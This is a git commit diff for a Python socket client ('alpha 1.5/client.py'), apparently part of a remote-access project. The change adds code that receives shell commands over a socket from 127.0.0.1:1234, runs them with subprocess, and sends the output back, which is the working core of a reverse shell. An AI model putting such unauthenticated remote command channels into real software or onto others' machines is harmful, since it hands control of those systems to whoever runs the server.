ec587f1c9bfa89056141409d8c11baca83a6d70a
Slou <slounity@gmail.com>
2023-02-25 23:41:57 +0100

    cmd gui function is ready

--- alpha 1.5/client.py
+++ alpha 1.5/client.py
@@ -1,6 +1,7 @@
 import socket
 import os
 import sys
+import subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -8,3 +9,10 @@ s.connect(('127.0.0.1', 1234))
 
 while True:
     cmd = s.recv(1024).decode()
+    
+    if cmd == 'cmd':
+        command = s.recv(1024).decode()
+        output = subprocess.getoutput(command)
+        if not output or output == '':
+            output = 'Command executed'
+        s.send(output.encode())
